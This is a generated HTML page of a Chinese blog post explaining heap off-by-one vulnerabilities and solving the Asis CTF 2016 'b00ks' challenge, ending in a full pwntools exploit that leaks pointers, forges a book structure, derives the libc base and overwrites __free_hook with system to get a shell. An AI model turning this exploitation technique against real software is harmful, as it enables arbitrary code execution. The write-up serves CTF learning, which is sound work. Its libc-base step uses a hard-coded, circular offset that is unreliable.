@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"erkeai.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="off-by-one漏洞原理off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括  使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。 字符串操作不合适  一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Off-By-One">
+<meta property="og:url" content="https://erkeai.github.io/2022/04/22/pwn/%E5%A0%86%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="hazel&#39;blog">
+<meta property="og:description" content="off-by-one漏洞原理off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括  使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。 字符串操作不合适  一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422152606252.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422165120899.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422170501731.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422170532547.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422173017935.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422172403311.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422181305302.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182430456.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182244641.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182310438.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182542583.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424160048417.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424161615083.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424172750488.png">
+<meta property="og:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424190405283.png">
+<meta property="article:published_time" content="2022-04-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-04-24T11:04:55.216Z">
+<meta property="article:author" content="ZouFeIYu">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="Off-By-One">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422152606252.png">
+
+<link rel="canonical" href="https://erkeai.github.io/2022/04/22/pwn/%E5%A0%86%E6%BA%A2%E5%87%BA/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Off-By-One | hazel'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">hazel'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">96</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">95</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/04/22/pwn/%E5%A0%86%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
+      <meta itemprop="name" content="ZouFeIYu">
+      <meta itemprop="description" content="reading, coding, travelling">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hazel'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Off-By-One
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-22 00:00:00" itemprop="dateCreated datePublished" datetime="2022-04-22T00:00:00+08:00">2022-04-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-24 19:04:55" itemprop="dateModified" datetime="2022-04-24T19:04:55+08:00">2022-04-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="off-by-one漏洞原理"><a href="#off-by-one漏洞原理" class="headerlink" title="off-by-one漏洞原理"></a>off-by-one漏洞原理</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
+<ul>
+<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
+<li>字符串操作不合适</li>
+</ul>
+<p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
+<h3 id="off-by-one利用思路"><a href="#off-by-one利用思路" class="headerlink" title="off-by-one利用思路"></a>off-by-one利用思路</h3><ol>
+<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
+<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
+</ol>
+<h3 id="实例1：Asis-CTF-2016-b00ks"><a href="#实例1：Asis-CTF-2016-b00ks" class="headerlink" title="实例1：Asis CTF 2016 b00ks"></a>实例1：Asis CTF 2016 <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>程序基本情况如下，为64位程序，开启了RELRO、NX、PIE，程序提供了创建、删除、编辑、打印图书的功能。</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422152606252.png" alt="image-20220422152606252"></p>
+<p>IDA看一下，首先是create，创建book时，name和description在堆上分配。首先使用malloc分配name buffer，大小不超过32；之后，分配description buffer, 大小自定义；最后分配book结构体，用于保存book的信息。</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422165120899.png" alt="image-20220422165120899"></p>
+<p>分析图中可知第一个+6其实就是4*6=24 =0x18，后面以此类推(qword=8个字节)。其中<code>unk_202024</code>存储的其实就是bookID</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422170501731.png" alt="image-20220422170501731"></p>
+<p><code>get_bookID</code>获取的其实是在array_ptr（其实就是多个book_struct）中为0的索引（应该是为了方便后面放数据）</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422170532547.png" alt="image-20220422170532547"></p>
+<p>点进<code>my_read</code>函数看一下，可以看到当输入数据的长度正好为size时，会向ptr中越界写入一个字节<code>\x00</code>。</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422173017935.png" alt="image-20220422173017935"></p>
+<p>以上分析总结如下图</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422172403311.png" alt="image-20220422172403311"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>当申请内存小于128k就会使用brk，大于128k的时候就会使用mmap，<strong>mmap开辟出的块与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能通过一个“固定的偏移”得到libc</strong></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422181305302.png" alt="image-20220422181305302"></p>
+<p>看一下主函数一开始的一个函数</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182430456.png" alt="image-20220422182430456"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182244641.png" alt="image-20220422182244641"></p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182310438.png" alt="image-20220422182310438"></p>
+<p>从上图看到my_read函数会读32个字节的数据到author_name（可以看到当输入数据的长度正好为32时，会向author_name中越界写入一个字节<code>\x00</code>。）</p>
+<p>printf函数用%s打印author_name,如果没有遇到<code>\x00</code>会一直输出，甚至输出array_ptr的内容。因此，如果名字长达32字节，就能够泄露出第一个book结构的地址。通过打印 author name 就可以获得 array_ptr 中第一项的值。</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220422182542583.png" alt="image-20220422182542583"></p>
+<p>为了实现泄漏，首先在 author name 中需要输入 32 个字节来使得结束符被覆盖掉。之后我们创建 book1 ，这个 book1 的指针会覆盖 author name 中最后的 NULL 字节，使得该指针与 author name 直接连接，这样输出 author name 则可以获取到一个堆指针。</p>
+<p>程序中同样提供了change_name 函数， 用于修改 author name ，所以通过 该函数可以写入 author name ，利用 off-by-one 覆盖 array_ptr 第一个项的低字节。</p>
+<p>覆盖掉 book1 指针的低字节(bookId)后，这个指针会指向 book1 的 description ，由于程序提供了 edit 功能可以任意修改 description 中的内容。我们可以提前在 description 中布置数据伪造成一个 book2结构，使得其中的book1_description_ptr指向book2_description_ptr；这样通过先后修改book1_description和book2_description，从而实现任意地址写任意内容的功能。</p>
+<p>我们已经获得了任意地址读写的能力，但是这个题目开启 PIE 并且没有泄漏 libc 基地址的方法，在分配第二个 book 时，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p>
+<p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424160048417.png" alt="image-20220424160048417"></p>
+<p>第一个框就是我们输入的32个a(author_name)，第二个框就是book1_struct_ptr，第三个框就是book2_struct_ptr。两者相差0x30，详细查看一下其中的内容，可以看到保存的分别是Id,name_ptr,des_ptr,des_size。</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424161615083.png" alt="image-20220424161615083"></p>
+<p>由于该程序启用了<code>FULL RELRO</code>保护措施，无法对<code>GOT</code>进行改写，但是可以改写<code>__free_hook</code>或<code>__malloc_hook</code>。</p>
+<p>将<code>__free_hook</code>指向的内容修改为<code>system</code>的地址，在调用<code>free</code>函数时，由于<code>__free_hook</code>里面的内容不为<code>NULL</code>，从而执行指向的指令。</p>
+<p><code>__free_hook</code>参考如下：</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424172750488.png" alt="image-20220424172750488"></p>
+<p>执行edit修改的是book_des_ptr和book_des_size的内容</p>
+<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220424190405283.png" alt="image-20220424190405283"></p>
+<p> 因为book1的des指向book2的des处，将该处改为<code>__free_hook</code>地址，那么写book2的des时就会往<code>__free_hook</code>处写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc=binary.libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span>(<span class="params">name_size, name, desc_size,desc</span>):</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>, name)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter book description size: &#x27;</span>, <span class="built_in">str</span>(desc_size))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter book description: &#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span>(<span class="params">name</span>):</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    io.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.readline()[:-<span class="number">1</span>])</span><br><span class="line">        io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_name = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">        io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_des = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">        io.readuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        book_author = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span>(<span class="params">bookId</span>):</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>, <span class="built_in">str</span>(bookId))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span>(<span class="params">bookId, desc</span>):</span></span><br><span class="line">    io.recv()</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>, <span class="built_in">str</span>(bookId))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter new book description: &#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">createname(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">128</span>, <span class="string">&quot;book1&quot;</span>, <span class="number">32</span>, <span class="string">&quot;book1 created&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak book1_struct_addr</span></span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book_addr_1 = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span> + <span class="built_in">hex</span>(book_addr_1))</span><br><span class="line"><span class="comment">#create book2, addr needs to be bigger(ex 0x21000), so that we can call mmap()</span></span><br><span class="line"></span><br><span class="line">createbook(<span class="number">0x21000</span>, <span class="string">&#x27;book_2&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;second book create&#x27;</span>)</span><br><span class="line"><span class="comment">#fake_book1_struct</span></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book_id_1 + <span class="number">0x38</span>) + p64(book_addr_1 + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(book_id_1,payload)</span><br><span class="line"></span><br><span class="line">changename(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2 name addr:&quot;</span> + <span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">&quot;book2 des addr:&quot;</span> + <span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">offset = book2_name_addr - <span class="number">0x7ffff79e2000</span></span><br><span class="line">libc_base = book2_name_addr - offset</span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line">binsh_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(book_id_1, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit_book(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11q4y1L7Ui/">bilibili这个讲的很清楚</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>ZouFeIYu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://erkeai.github.io/2022/04/22/pwn/%E5%A0%86%E6%BA%A2%E5%87%BA/" title="Off-By-One">https://erkeai.github.io/2022/04/22/pwn/堆溢出/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/tags/Off-By-One/" rel="tag"># Off-By-One</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/20/Cheese_point/%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81API%20hooking/" rel="prev" title="绕过用户态API hooking">
+      <i class="fa fa-chevron-left"></i> 绕过用户态API hooking
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/05/leetcode/%E4%BB%A3%E7%A0%81%E9%9A%8F%E6%83%B3%E5%BD%95%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%A4%A9/" rel="next" title="代码随想录第二十七天">
+      代码随想录第二十七天 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
